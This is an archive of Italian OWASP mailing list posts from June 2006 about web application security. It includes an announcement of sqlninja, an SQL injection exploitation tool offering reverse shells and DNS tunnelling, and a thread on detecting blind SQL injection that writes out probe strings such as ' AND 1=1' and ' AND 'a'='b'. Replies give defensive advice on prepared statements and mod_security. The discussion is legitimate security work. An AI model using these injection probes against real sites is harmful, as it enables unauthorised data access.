From luca.carettoni at ikkisoft.com  Thu Jun  1 05:42:56 2006
From: luca.carettoni at ikkisoft.com (Luca Carettoni)
Date: Thu, 1 Jun 2006 11:42:56 +0200
Subject: [Owasp-italy] La sicurezza delle applicazioni web secondo OWASP
In-Reply-To: <58242.195.223.77.60.1149114415.squirrel@mail.owasp.org>
References: <EE8DACAC-F648-4242-8171-3048E0E12E2D@ikkisoft.com> <58242.195.223.77.60.1149114415.squirrel@mail.owasp.org>
Message-ID: <0411D90B-78CF-4555-AB1A-828B32A6E7C9@ikkisoft.com>

On 01/giu/06, at 00:26, Matteo Meucci wrote:

> Ciao Luca,
> gran bell'articolo!
> Hai fatto benissimo. Se ti va, visto che fai parte di OWASP-Italy,
> possiamo pubblicare  sul nostro site il fatto che hai redatto questo
> articolo.

Per me nessun problema, anzi...
Oltre a questo, nelle prossime settimane, ne seguiranno altri due che  
illustrano in maniera semplice le vulnerabilit? presenti nella OWASP  
Top Ten.

>
> Avete visto la nuova veste wiki-like del sito? Che ne pensate?
> Il modello Wiki permette a tutti di collaborare al progetto in maniera
> molto pi? semplice ed immediata.

Ottimo...a mio avviso risultano anche pi? ordinati i contenuti.

--
Luca -Ikki- Carettoni


From matteo.meucci at gmail.com  Thu Jun  1 11:05:41 2006
From: matteo.meucci at gmail.com (Matteo Meucci)
Date: Thu, 1 Jun 2006 17:05:41 +0200
Subject: [Owasp-italy] La sicurezza delle applicazioni web secondo OWASP
In-Reply-To: <0411D90B-78CF-4555-AB1A-828B32A6E7C9@ikkisoft.com>
References: <EE8DACAC-F648-4242-8171-3048E0E12E2D@ikkisoft.com>
	<58242.195.223.77.60.1149114415.squirrel@mail.owasp.org>
	<0411D90B-78CF-4555-AB1A-828B32A6E7C9@ikkisoft.com>
Message-ID: <d2d9d92d0606010805w51e1f8e9t362759d7c4db5b14@mail.gmail.com>

Perfetto Luca.
Ho gi? aggiornato il sito: http://www.owasp.org/index.php/Italy

Ho anche aggiunto la conferma da parte del CLUSIT della pubblicazione
del quaderno "La verifica della sicurezza delle applicazioni web-based
ed il progetto OWASP".
Il documento ? opera del CLUSIT ed OWASP-Italy ha contribuito alla stesura.
Per il momento il documento ? riservato ai soli soci CLUSIT, ma tra
circa tre mesi dovrebbe divenire di pubblico dominio.

Grazie,
Mat



On 6/1/06, Luca Carettoni <luca.carettoni at ikkisoft.com> wrote:
> On 01/giu/06, at 00:26, Matteo Meucci wrote:
>
> > Ciao Luca,
> > gran bell'articolo!
> > Hai fatto benissimo. Se ti va, visto che fai parte di OWASP-Italy,
> > possiamo pubblicare  sul nostro site il fatto che hai redatto questo
> > articolo.
>
> Per me nessun problema, anzi...
> Oltre a questo, nelle prossime settimane, ne seguiranno altri due che
> illustrano in maniera semplice le vulnerabilit? presenti nella OWASP
> Top Ten.
>
> >
> > Avete visto la nuova veste wiki-like del sito? Che ne pensate?
> > Il modello Wiki permette a tutti di collaborare al progetto in maniera
> > molto pi? semplice ed immediata.
>
> Ottimo...a mio avviso risultano anche pi? ordinati i contenuti.
>
> --
> Luca -Ikki- Carettoni
>
> -------------------------------------------------------
> All the advantages of Linux Managed Hosting--Without the Cost and Risk!
> Fully trained technicians. The highest number of Red Hat certifications in
> the hosting industry. Fanatical Support. Click to learn more
> http://sel.as-us.falkag.net/sel?cmdlnk&kid7521&bid$8729&dat1642
> _______________________________________________
> Owasp-Italy mailing list
> Owasp-Italy at lists.sourceforge.net
> https://lists.sourceforge.net/lists/listinfo/owasp-italy
>


-- 
Matteo Meucci
OWASP-Italy Chair, CISSP
site: http://www.owasp.org/local/italy.html
mail: matteo.meucci at owasp.org
ml: https://lists.sourceforge.net/lists/listinfo/owasp-italy



From a.revelli at reply.it  Thu Jun 15 11:45:51 2006
From: a.revelli at reply.it (Alberto Revelli)
Date: Thu, 15 Jun 2006 17:45:51 +0200
Subject: [Owasp-italy] sqlninja-0.1.0alpha
Message-ID: <1150386351.7425.23.camel@localhost>

Ciao a tutti,

la versione 0.1.0 di sqlninja e' da oggi disponibile online
all'indirizzo http://sqlninja.sourceforge.net !

sqlninja e' un tool per l'exploiting di SQL Injection su Microsoft SQL
Server, e mira a fornire una shell remota anche in presenza di firewall
particolarmente paranoici.

Le principali funzionalita' sono:
- Upload di eseguibili sul DB Server remoto usando unicamente richieste
HTTP, eliminando la necessita' di collegamenti FTP/TFTP da parte del DB
Server
- Ricerca di porte permesse dal firewall in uscita, allo scopo di
ottenere una reverse shell
- Direct/reverse bindshell, sia TCP che UDP
- Possibilita' di tunnelizzare la shell all'interno di normali richieste
DNS, nel caso nessuna porta sia permessa dal firewall

Altre funzionalita' sono gia' in cantiere (e.g.: tunneling su altri
protocolli, cifratura delle comunicazioni, ...)

Il tool e' ancora in alpha, per cui siete incoraggiati a giocarci
(possibilmente in maniera legale) e a segnalarmi i bug che trovate.

Buon divertimento !

A.

--
The information transmitted is intended for the person or entity to which it is addressed and may contain confidential and/or privileged material. Any review, retransmission, dissemination or other use of, or taking of any action in reliance upon, this information by persons or entities other than the intended recipient is prohibited. If you received this in error, please contact the sender and delete the material from any computer.



From aparata at gmail.com  Tue Jun 20 16:47:11 2006
From: aparata at gmail.com (antonio parata)
Date: Tue, 20 Jun 2006 22:47:11 +0200
Subject: [Owasp-italy] Paper su SQL Injection and Inference on PHP/MySQL
Message-ID: <e1180a5f0606201347t74044ddbmeec31ee1cf11a734@mail.gmail.com>

Buond?,

volevo solo annunciarvi che ho scritto un paper riguardante attacchi di
tipo SQL Injection basato su inferenza per testare applicativi web su
piattaforma PHP/MySQL.

Chi ha fatto un po' di testing su applicazioni web in presenza di MySQL
sicuramente sapra' quanto sia ostico riuscire a ottenere qualcosa di utile.

Spero con questo paper di darvi un minimo di aiuto :)

Saluti,
Antonio Parata

P.S.
Quasi dimenticavo allegato vi ? anche un semplice tool scritto in perl
che vi supporta nell'esecuzione dei vari test
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://lists.owasp.org/pipermail/owasp-italy/attachments/20060620/1f9b816a/attachment.html 

From guido.serra at gmail.com  Wed Jun 21 10:07:14 2006
From: guido.serra at gmail.com (Guido Serra)
Date: Wed, 21 Jun 2006 16:07:14 +0200
Subject: [Owasp-italy] Paper su SQL Injection and Inference on PHP/MySQL
In-Reply-To: <e1180a5f0606201347t74044ddbmeec31ee1cf11a734@mail.gmail.com>
References: <e1180a5f0606201347t74044ddbmeec31ee1cf11a734@mail.gmail.com>
Message-ID: <CC759442-C536-454B-A0DF-7FF5A302A61A@gmail.com>

> Chi ha fatto un po' di testing su applicazioni web in presenza di  
> MySQL
> sicuramente sapra' quanto sia ostico riuscire a ottenere qualcosa  
> di utile.
>
> Spero con questo paper di darvi un minimo di aiuto :)

fantastico ;)

ma... manca l'allegato

lol

--
Guido Serra
+39 348/4313992
http://guidoserra.it





From aparata at gmail.com  Wed Jun 21 09:46:13 2006
From: aparata at gmail.com (antonio parata)
Date: Wed, 21 Jun 2006 15:46:13 +0200
Subject: [Owasp-italy] Paper su SQL Injection and Inference on PHP/MySQL
Message-ID: <e1180a5f0606210646g682c65ecn39c5ef55bc18265@mail.gmail.com>

Avevo tralasciato un piccolo dettaglio, l'url e':

http://www.ictsc.it/papers/sqlInferenceOnMySql.html

Sorry :)

>
>Buond?,
>
>volevo solo annunciarvi che ho scritto un paper riguardante attacchi di
>tipo SQL Injection basato su inferenza per testare applicativi web su
>piattaforma PHP/MySQL.
>
>Chi ha fatto un po' di testing su applicazioni web in presenza di MySQL
>sicuramente sapra' quanto sia ostico riuscire a ottenere qualcosa di utile.
>
>Spero con questo paper di darvi un minimo di aiuto :)
>
>Saluti,
>Antonio Parata
>
>P.S.
>Quasi dimenticavo allegato vi ? anche un semplice tool scritto in perl
>che vi supporta nell'esecuzione dei vari test
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://lists.owasp.org/pipermail/owasp-italy/attachments/20060621/3a21070e/attachment.html 

From lterenz at gmail.com  Thu Jun 22 13:25:21 2006
From: lterenz at gmail.com (Luca Terenziani)
Date: Thu, 22 Jun 2006 19:25:21 +0200
Subject: [Owasp-italy] Blind SQL Injection e falsi positivi
Message-ID: <5c51638d0606221025j707853edkf59b2f1dbae19bd2@mail.gmail.com>

Ciao a tutti,

da un po` di tempo sto` "programmando" un tool per Blind SQL InjectionS.

Ora la domanda che vi pongo e` la seguente:

supponiamo che voglia testare la Blind SQL Inj. sulla seguente
URL:
http://acme?idcat=1

Un primo approccio potrebbe essere:

*) memorizzo il contenuto della pagina di partenza
*) memorizzare il contenuto di una pagina contenente
   " AND 1=1"
*) memorizzare il contenuto di una pagina contenente
   " AND 1=9"

e dire che la Blind Injection e` andata a buon fine
se e soltanto se:
1) l'HTML di http://acme?idcat=1 != http://acme?idcat=1 AND 9=9
2) l'HTML di http://acme?idcat=1 == http://acme?idcat=1 AND 1=1

Ora la domanda che ci si puo` porre e` la seguente:
"Come viene effettuato il confronto tra gli HTML" ?

Un primo approccio potrebbe essere:confronto carattere per carattere.
Questo approccio potrebbe essere "attenuato" da un modulo ISAPI/mod_*
che inserisce all'interno del body delle HTTP RESPONSE:
*) caratteri random
*) TAG html che rendono il risultato della renderizzazione da parte
   del browser intatto

oppure potrei utilizzare una delle tante techiche di steganografia su
HTML.. roba tipo:
<IMG SRC="picture.jpg" ALT="A picture"> viene riscritta in:
<IMG ALT="A picture" SRC="picture.jpg">
utilizzando un certo set di "regole di riscrittura HTML" che rendono
intatta la renderizzazione dai browser .. potrei generare una miriade
di pagine HTML differenti.


Certo e` che se il mio tool di SQL Injection una volta memorizzate
le pagine, strippa via tutti i tag HTML riesco ad evadere il meccanismo.

Ma a questo punto, se voglio attenuare ulteriormente Blind SQL
Injection, potrei steganografizzare il testo dell'HTML... al fine di
generare pagina diverse anche nel testo, che portano verso lo stesso
risultato.

Ma anche questo tipo di hardening potrebbe essere facilmente
"spezzato" facendo si che l'algoritmo di confronto per la Blind SQL
Inj. strippi via pure ' ' e '\n'


Ora, al di la` del lungo poema (aka; pippa mentale) la domanda che
volevo porvi e` la seguente:
*) Acunetix, Wikto, WebInspect,etc. etc. come effettuano il confronto
   sui fault injection?
*) Quali tecniche mi consentono di "attenuare" le SQL Injection lato
   server (e non WEBAPP!!!!)


Meditate gente, meditate



From antoniomassimo.parata at fastwebnet.it  Thu Jun 22 14:56:02 2006
From: antoniomassimo.parata at fastwebnet.it (antonio "s4tan" parata)
Date: Thu, 22 Jun 2006 20:56:02 +0200
Subject: [Owasp-italy] Blind SQL Injection e falsi positivi
In-Reply-To: <5c51638d0606221025j707853edkf59b2f1dbae19bd2@mail.gmail.com>
References: <5c51638d0606221025j707853edkf59b2f1dbae19bd2@mail.gmail.com>
Message-ID: <449AE7C2.60303@fastwebnet.it>

Ciao Luca,

per quanto riguarda la prima domanda, la maggior parte dei tool di 
vulnerability assessment ci? che fa ? semplicemente verificare se 
l'applicazione ? vulnerabile facendo un semplice patter matching 
dell'HTML ottenuto ? controllano se vi ? la presenza di stringhe di 
errore tipo "ODBC Error" o roba simile. O almeno questo ? cio che fa 
Acunetix (ma penso anchi gli altri tool), infatti il suo test sull'SQL 
Injection si limita ad inviare i valori ' e %25 (mi sembra) e 
controllare l'output.

Nel caso di Blind SQL Injection (in cui gli errori non sono rilevati), 
al blackhat 2004 il gruppo hacker 0x90 ha presentato una ricerca proprio 
su tale argomento, se ti interessa ti posto il riferimento:
http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-hotchkies/bh-us-04-hotchkies.pdf

Per quanto riguarda la protezione, bella domanda :)
Indubbiamente la soluzione migliore ? scrivere applicazioni sicure, ma 
questa ? un'utopia.

A occhio e croce dovresti avere un qualcosa che controlla tutte le 
richieste HTTP ed effettua un backslah dei caratteri ', ma ci? non 
basta, infatti nel caso l'imput ? un numero, non ho bisogno di inserire 
il carattere '.
Diciamo che ? una questione alquanto spinosa :D
Se ti interessa per Apache puoi provare modesecurity 
(http://www.modsecurity.org).

Spero di esserti stato d'aituo, ciao
Antonio "s4tan" Parata

Luca Terenziani ha scritto:
> Ciao a tutti,
>
> da un po` di tempo sto` "programmando" un tool per Blind SQL InjectionS.
>
> Ora la domanda che vi pongo e` la seguente:
>
> supponiamo che voglia testare la Blind SQL Inj. sulla seguente
> URL:
> http://acme?idcat=1
>
> Un primo approccio potrebbe essere:
>
> *) memorizzo il contenuto della pagina di partenza
> *) memorizzare il contenuto di una pagina contenente
>    " AND 1=1"
> *) memorizzare il contenuto di una pagina contenente
>    " AND 1=9"
>
> e dire che la Blind Injection e` andata a buon fine
> se e soltanto se:
> 1) l'HTML di http://acme?idcat=1 != http://acme?idcat=1 AND 9=9
> 2) l'HTML di http://acme?idcat=1 == http://acme?idcat=1 AND 1=1
>
> Ora la domanda che ci si puo` porre e` la seguente:
> "Come viene effettuato il confronto tra gli HTML" ?
>
> Un primo approccio potrebbe essere:confronto carattere per carattere.
> Questo approccio potrebbe essere "attenuato" da un modulo ISAPI/mod_*
> che inserisce all'interno del body delle HTTP RESPONSE:
> *) caratteri random
> *) TAG html che rendono il risultato della renderizzazione da parte
>    del browser intatto
>
> oppure potrei utilizzare una delle tante techiche di steganografia su
> HTML.. roba tipo:
> <IMG SRC="picture.jpg" ALT="A picture"> viene riscritta in:
> <IMG ALT="A picture" SRC="picture.jpg">
> utilizzando un certo set di "regole di riscrittura HTML" che rendono
> intatta la renderizzazione dai browser .. potrei generare una miriade
> di pagine HTML differenti.
>
>
> Certo e` che se il mio tool di SQL Injection una volta memorizzate
> le pagine, strippa via tutti i tag HTML riesco ad evadere il meccanismo.
>
> Ma a questo punto, se voglio attenuare ulteriormente Blind SQL
> Injection, potrei steganografizzare il testo dell'HTML... al fine di
> generare pagina diverse anche nel testo, che portano verso lo stesso
> risultato.
>
> Ma anche questo tipo di hardening potrebbe essere facilmente
> "spezzato" facendo si che l'algoritmo di confronto per la Blind SQL
> Inj. strippi via pure ' ' e '\n'
>
>
> Ora, al di la` del lungo poema (aka; pippa mentale) la domanda che
> volevo porvi e` la seguente:
> *) Acunetix, Wikto, WebInspect,etc. etc. come effettuano il confronto
>    sui fault injection?
> *) Quali tecniche mi consentono di "attenuare" le SQL Injection lato
>    server (e non WEBAPP!!!!)
>
>
> Meditate gente, meditate
>
> Using Tomcat but need to do more? Need to support web services, security?
> Get stuff done quickly with pre-integrated technology to make your job easier
> Download IBM WebSphere Application Server v.1.0.1 based on Apache Geronimo
> http://sel.as-us.falkag.net/sel?cmd=lnk&kid=120709&bid=263057&dat=121642
> _______________________________________________
> Owasp-Italy mailing list
> Owasp-Italy at lists.sourceforge.net
> https://lists.sourceforge.net/lists/listinfo/owasp-italy
>
>   




From trivero at jumpyt.it  Thu Jun 22 14:59:35 2006
From: trivero at jumpyt.it (Alberto Trivero)
Date: Thu, 22 Jun 2006 20:59:35 +0200
Subject: [Owasp-italy] Blind SQL Injection e falsi positivi
References: <5c51638d0606221025j707853edkf59b2f1dbae19bd2@mail.gmail.com>
Message-ID: <002401c6962e$01775e60$2101a8c0@alberto>

Ma per confrontare le pagine non ? pi? conveniente e rapido calcolare l'hash
md5 delle pagine risultanti, per esempio, dalle query:

1) pagina.asp?id=1
2) pagina.asp?id=1' AND 'a'='a
3) pagina.asp?id=1' AND 'a'='b

e verificare se i primi due sono uguali e il terzo differente? Per quanto
riguarda i software commerciali non ho idea di come confrontino i risultati;
comunque girando un p? puoi trovare facilmente algoritmi di chi come te ha
sviluppato codici simili.
Per "attenuare" cosa intendi? Se ti interessanto tecniche di "signatures
evasion" questo ? un buon paper:
http://www.imperva.com/application_defense_center/white_papers/sql_injection
_signatures_evasion.html


a|by.


----- Original Message -----
From: "Luca Terenziani" <lterenz at gmail.com>
To: "owasp-italy" <owasp-italy at lists.sourceforge.net>
Sent: Thursday, June 22, 2006 7:25 PM
Subject: [Owasp-italy] Blind SQL Injection e falsi positivi


> Ciao a tutti,
>
> da un po` di tempo sto` "programmando" un tool per Blind SQL InjectionS.
>
> Ora la domanda che vi pongo e` la seguente:
>
> supponiamo che voglia testare la Blind SQL Inj. sulla seguente
> URL:
> http://acme?idcat=1
>
> Un primo approccio potrebbe essere:
>
> *) memorizzo il contenuto della pagina di partenza
> *) memorizzare il contenuto di una pagina contenente
>    " AND 1=1"
> *) memorizzare il contenuto di una pagina contenente
>    " AND 1=9"
>
> e dire che la Blind Injection e` andata a buon fine
> se e soltanto se:
> 1) l'HTML di http://acme?idcat=1 != http://acme?idcat=1 AND 9=9
> 2) l'HTML di http://acme?idcat=1 == http://acme?idcat=1 AND 1=1
>
> Ora la domanda che ci si puo` porre e` la seguente:
> "Come viene effettuato il confronto tra gli HTML" ?
>
> Un primo approccio potrebbe essere:confronto carattere per carattere.
> Questo approccio potrebbe essere "attenuato" da un modulo ISAPI/mod_*
> che inserisce all'interno del body delle HTTP RESPONSE:
> *) caratteri random
> *) TAG html che rendono il risultato della renderizzazione da parte
>    del browser intatto
>
> oppure potrei utilizzare una delle tante techiche di steganografia su
> HTML.. roba tipo:
> <IMG SRC="picture.jpg" ALT="A picture"> viene riscritta in:
> <IMG ALT="A picture" SRC="picture.jpg">
> utilizzando un certo set di "regole di riscrittura HTML" che rendono
> intatta la renderizzazione dai browser .. potrei generare una miriade
> di pagine HTML differenti.
>
>
> Certo e` che se il mio tool di SQL Injection una volta memorizzate
> le pagine, strippa via tutti i tag HTML riesco ad evadere il meccanismo.
>
> Ma a questo punto, se voglio attenuare ulteriormente Blind SQL
> Injection, potrei steganografizzare il testo dell'HTML... al fine di
> generare pagina diverse anche nel testo, che portano verso lo stesso
> risultato.
>
> Ma anche questo tipo di hardening potrebbe essere facilmente
> "spezzato" facendo si che l'algoritmo di confronto per la Blind SQL
> Inj. strippi via pure ' ' e '\n'
>
>
> Ora, al di la` del lungo poema (aka; pippa mentale) la domanda che
> volevo porvi e` la seguente:
> *) Acunetix, Wikto, WebInspect,etc. etc. come effettuano il confronto
>    sui fault injection?
> *) Quali tecniche mi consentono di "attenuare" le SQL Injection lato
>    server (e non WEBAPP!!!!)
>
>
> Meditate gente, meditate
>
> Using Tomcat but need to do more? Need to support web services, security?
> Get stuff done quickly with pre-integrated technology to make your job
easier
> Download IBM WebSphere Application Server v.1.0.1 based on Apache Geronimo
> http://sel.as-us.falkag.net/sel?cmd=lnk&kid=120709&bid=263057&dat=121642
> _______________________________________________
> Owasp-Italy mailing list
> Owasp-Italy at lists.sourceforge.net
> https://lists.sourceforge.net/lists/listinfo/owasp-italy




From trivero at jumpyt.it  Thu Jun 22 15:12:29 2006
From: trivero at jumpyt.it (Alberto Trivero)
Date: Thu, 22 Jun 2006 21:12:29 +0200
Subject: [Owasp-italy] Blind SQL Injection e falsi positivi
References: <5c51638d0606221025j707853edkf59b2f1dbae19bd2@mail.gmail.com>
Message-ID: <004301c6962f$d03d85c0$2101a8c0@alberto>

Scusate, lo stress degli esami gioca brutti scherzi.. Ho capito ora qual ?
la tua seconda richiesta.
Kses ( http://sourceforge.net/projects/kses ) potrebbe fare al caso tuo
anche se onostemente non ho mai avuto modo di testarlo.

a|by.


----- Original Message -----
From: "Luca Terenziani" <lterenz at gmail.com>
To: "owasp-italy" <owasp-italy at lists.sourceforge.net>
Sent: Thursday, June 22, 2006 7:25 PM
Subject: [Owasp-italy] Blind SQL Injection e falsi positivi


> Ciao a tutti,
>
> da un po` di tempo sto` "programmando" un tool per Blind SQL InjectionS.
>
> Ora la domanda che vi pongo e` la seguente:
>
> supponiamo che voglia testare la Blind SQL Inj. sulla seguente
> URL:
> http://acme?idcat=1
>
> Un primo approccio potrebbe essere:
>
> *) memorizzo il contenuto della pagina di partenza
> *) memorizzare il contenuto di una pagina contenente
>    " AND 1=1"
> *) memorizzare il contenuto di una pagina contenente
>    " AND 1=9"
>
> e dire che la Blind Injection e` andata a buon fine
> se e soltanto se:
> 1) l'HTML di http://acme?idcat=1 != http://acme?idcat=1 AND 9=9
> 2) l'HTML di http://acme?idcat=1 == http://acme?idcat=1 AND 1=1
>
> Ora la domanda che ci si puo` porre e` la seguente:
> "Come viene effettuato il confronto tra gli HTML" ?
>
> Un primo approccio potrebbe essere:confronto carattere per carattere.
> Questo approccio potrebbe essere "attenuato" da un modulo ISAPI/mod_*
> che inserisce all'interno del body delle HTTP RESPONSE:
> *) caratteri random
> *) TAG html che rendono il risultato della renderizzazione da parte
>    del browser intatto
>
> oppure potrei utilizzare una delle tante techiche di steganografia su
> HTML.. roba tipo:
> <IMG SRC="picture.jpg" ALT="A picture"> viene riscritta in:
> <IMG ALT="A picture" SRC="picture.jpg">
> utilizzando un certo set di "regole di riscrittura HTML" che rendono
> intatta la renderizzazione dai browser .. potrei generare una miriade
> di pagine HTML differenti.
>
>
> Certo e` che se il mio tool di SQL Injection una volta memorizzate
> le pagine, strippa via tutti i tag HTML riesco ad evadere il meccanismo.
>
> Ma a questo punto, se voglio attenuare ulteriormente Blind SQL
> Injection, potrei steganografizzare il testo dell'HTML... al fine di
> generare pagina diverse anche nel testo, che portano verso lo stesso
> risultato.
>
> Ma anche questo tipo di hardening potrebbe essere facilmente
> "spezzato" facendo si che l'algoritmo di confronto per la Blind SQL
> Inj. strippi via pure ' ' e '\n'
>
>
> Ora, al di la` del lungo poema (aka; pippa mentale) la domanda che
> volevo porvi e` la seguente:
> *) Acunetix, Wikto, WebInspect,etc. etc. come effettuano il confronto
>    sui fault injection?
> *) Quali tecniche mi consentono di "attenuare" le SQL Injection lato
>    server (e non WEBAPP!!!!)
>
>
> Meditate gente, meditate
>
> Using Tomcat but need to do more? Need to support web services, security?
> Get stuff done quickly with pre-integrated technology to make your job
easier
> Download IBM WebSphere Application Server v.1.0.1 based on Apache Geronimo
> http://sel.as-us.falkag.net/sel?cmd=lnk&kid=120709&bid=263057&dat=121642
> _______________________________________________
> Owasp-Italy mailing list
> Owasp-Italy at lists.sourceforge.net
> https://lists.sourceforge.net/lists/listinfo/owasp-italy




From stefano.dipaola at wisec.it  Fri Jun 23 07:12:04 2006
From: stefano.dipaola at wisec.it (Stefano Di Paola)
Date: Fri, 23 Jun 2006 13:12:04 +0200
Subject: [Owasp-italy] Blind SQL Injection e falsi positivi
In-Reply-To: <002401c6962e$01775e60$2101a8c0@alberto>
References: <5c51638d0606221025j707853edkf59b2f1dbae19bd2@mail.gmail.com>
	<002401c6962e$01775e60$2101a8c0@alberto>
Message-ID: <1151061124.6891.71.camel@localhost.localdomain>

Ciao Luca,


"Luca Terenziani" wrote:
>  Ora la domanda che vi pongo e` la seguente:
> 
>  supponiamo che voglia testare la Blind SQL Inj. sulla seguente
>  URL:
>  http://acme?idcat=1
> 
>  Un primo approccio potrebbe essere:
> 
>  *) memorizzo il contenuto della pagina di partenza
>  *) memorizzare il contenuto di una pagina contenente
>     " AND 1=1"
>  *) memorizzare il contenuto di una pagina contenente
>     " AND 1=9"
> 
>  e dire che la Blind Injection e` andata a buon fine
>  se e soltanto se:
>  1) l'HTML di http://acme?idcat=1 != http://acme?idcat=1 AND 9=9
>  2) l'HTML di http://acme?idcat=1 == http://acme?idcat=1 AND 1=1

Dai un occhiata a Sqlbftools
http://www.reversing.org/node/view/11
( ci sono anche un paio di video  http://www.milw0rm.com/video/ )

Ti riuscira' meglio confrontare i metodi di verifica e di inferenza.
In particolare considera due metodi:
1. uno semi-automatico. sei tu via linea di comando che dici al sw che pezzo di testo (plain o html)
   cercare quando la blind e' andata o no a buon fine.
2. uno automatico.Attraverso le funzioni di delay e benchmarking, ovviamente se presenti.

Come hai gia' ben considerato, l'approccio del confronto sulla pagina html puo' dare, per vari motivi
dei falsi positivi.



>  Ora la domanda che ci si puo` porre e` la seguente:
>  "Come viene effettuato il confronto tra gli HTML" ?
> 
>  Un primo approccio potrebbe essere:confronto carattere per carattere.
>  Questo approccio potrebbe essere "attenuato" da un modulo ISAPI/mod_*
>  che inserisce all'interno del body delle HTTP RESPONSE:
>  *) caratteri random
>  *) TAG html che rendono il risultato della renderizzazione da parte
>     del browser intatto
> 
>  oppure potrei utilizzare una delle tante techiche di steganografia su
>  HTML.. roba tipo:
>  <IMG SRC="picture.jpg" ALT="A picture"> viene riscritta in:
>  <IMG ALT="A picture" SRC="picture.jpg">
>  utilizzando un certo set di "regole di riscrittura HTML" che rendono
>  intatta la renderizzazione dai browser .. potrei generare una miriade
>  di pagine HTML differenti.
> 

Mitigare la sql inj usando queste tecniche mi sembra come chiudere
gli occhi per non vedere il braccio rotto, o se preferisci c'e' 
l'analogia dello struzzo con la testa nella sabbia,
oppure quella della Guida Galattica che dice che bisogna mettersi un asciugamano
sulla testa per evitare lo sguardo della Vorace Bestia Bugblatta di Traal 
(un animale abominevolmente stupido, che pensa che se voi non lo vedete nemmeno 
lui possa vedere voi: ? matto da legare, ma molto, molto vorace) :)

Mitigare queste cose e' molto difficile se non evitando di creare i bachi alla 
fonte...usando best practice di programmazione e progettazione.
1.Controllo/cast di tipo dei parametri _sempre_
2.Stored Procedures o prepared statements  se possibile.
3.Tante altre cose che trovi in giro sul web
4.Sapere cosa si programma =) ovvero avere la visione globale di tutti i layer che il flusso degli input 
  attraversa. Aka conoscere le specifiche di interfaccia.

Ovviamente se l'applicazione e' gia stata scritta, ci sono i web application firewall
che possono, se ben configurati, mitigare molte vulnerabilita' usando  regole di white/blacklisting
su parametri specifici o su input in generale.
come ha gia' detto Antonio (potrei sbagliare perche' non ho sottomano la mail) c'e' _Il_ waf open source
 www.modsecurity.org/ 
Le regole generiche le trovi via google.
Ho scritto un po di idee sulla generazione semi automatica di regole whitelist che puoi trovare
su 
http://www.wisec.it/sectou.php

Molto in alpha il mio modestissimo (da non usare in produzione :) mod_anti_tamper 
http://www.wisec.it/projects.php?id=3 
Che ho sviluppato piu' che altro come esercizio di stile e verifica dell'applicabilita' dell'idea.
Su siti semplici funziona mentre su sistemi un po' piu' complessi e' da migliorare e/o cestinare..

>  Certo e` che se il mio tool di SQL Injection una volta memorizzate
>  le pagine, strippa via tutti i tag HTML riesco ad evadere il meccanismo.
> 
>  Ma a questo punto, se voglio attenuare ulteriormente Blind SQL
>  Injection, potrei steganografizzare il testo dell'HTML... al fine di
>  generare pagina diverse anche nel testo, che portano verso lo stesso
>  risultato.
>  Ma anche questo tipo di hardening potrebbe essere facilmente
>  "spezzato" facendo si che l'algoritmo di confronto per la Blind SQL
>  Inj. strippi via pure ' ' e '\n'

Verifica eventualmente se un approccio di similarita' del testo e' applicabile.
Tipo soglia  percentuale(mi sa che Absinthe ne fa uso) .
Qui puoi trovare un po' di buone idee algoritmi:
http://www.google.it/search?hl=it&q=text+similarity

>  Ora, al di la` del lungo poema (aka; pippa mentale) la domanda che
>  volevo porvi e` la seguente:
>  *) Acunetix, Wikto, WebInspect,etc. etc. come effettuano il confronto
>     sui fault injection?
>  *) Quali tecniche mi consentono di "attenuare" le SQL Injection lato
>     server (e non WEBAPP!!!!)

Leggi su. =)

my 0.02 
Stefano


<saluti>
 Ne approfitto per salutare tutti essendo il primo post.
</saluti>

...oOOo...oOOo....
Stefano Di Paola
Ingegnere Informatico

Web: http://www.wisec.it
..................




From matteo.meucci at gmail.com  Tue Jun 27 12:54:05 2006
From: matteo.meucci at gmail.com (Matteo Meucci)
Date: Tue, 27 Jun 2006 18:54:05 +0200
Subject: [Owasp-italy] Fwd: OWASP PHP Top 5 published
In-Reply-To: <8BC1AD1C-C74E-4064-BB37-093A31A17DC5@greebo.net>
References: <8BC1AD1C-C74E-4064-BB37-093A31A17DC5@greebo.net>
Message-ID: <d2d9d92d0606270954n32293b2du527375ded7bf10ec@mail.gmail.com>

---------- Forwarded message ----------
From: Andrew van der Stock <vanderaj at greebo.net>
Date: Jun 26, 2006 7:21 PM
Subject: OWASP PHP Top 5 published
To: "Webappsec ((((E-mail))))" <webappsec at securityfocus.com>


OWASP is pleased to announce the immediate availability of the OWASP
PHP Top 5. The OWASP Top 5 is an education piece which provides up to
date advice to PHP developers, hosters, and other PHP users. The PHP
Top 5 is produced by the OWASP PHP Project.

The PHP Top 5 is based upon attack frequency in 2005 as reported to
Bugtraq. This information is a valuable insight into the most
devastating attacks against the world's most popular web application
framework.

In 2005, OWASP collaborated with SANS to research and write a
completely new PHP section for their successful SANS Top 20 2005. The
OWASP PHP Top 5 is the full unabridged text, updated to reflect
recent XSS attacks and SQL injection vectors.



OWASP PHP Top 5

http://www.owasp.org/index.php/PHP_Top_5



OWASP PHP Project

http://www.owasp.org/index.php/Category:OWASP_PHP_Project



-- 
Matteo Meucci
OWASP-Italy Chair, CISSP
site: http://www.owasp.org/index.php/Italy
mail: matteo.meucci at owasp.org
ml: https://lists.sourceforge.net/lists/listinfo/owasp-italy
-------------- next part --------------
A non-text attachment was scrubbed...
Name: smime.p7s
Type: application/pkcs7-signature
Size: 2234 bytes
Desc: not available
Url : http://lists.owasp.org/pipermail/owasp-italy/attachments/20060627/c2768439/attachment.bin 

From matteo.meucci at gmail.com  Tue Jun 27 12:54:29 2006
From: matteo.meucci at gmail.com (Matteo Meucci)
Date: Tue, 27 Jun 2006 18:54:29 +0200
Subject: [Owasp-italy] Fwd: New version of WebScarab released
In-Reply-To: <449BD0D7.7010905@dawes.za.net>
References: <449BD0D7.7010905@dawes.za.net>
Message-ID: <d2d9d92d0606270954h72fb188g7c29f04f519a7a18@mail.gmail.com>

---------- Forwarded message ----------
From: Rogan Dawes <discard at dawes.za.net>
Date: Jun 23, 2006 1:30 PM
Subject: New version of WebScarab released
To: webappsec at securityfocus.com, pen-test at securityfocus.com


Hi folks,

I have made a new release of WebScarab available on Sourceforge, to
celebrate it being placed in position 35 of Fyodor's annual-ish pen
testing tools survey.

You can download it here:

<http://sourceforge.net/project/showfiles.php?group_id=64424&package_id=61823>

There are quite a few smallish changes under the hood, which you can see
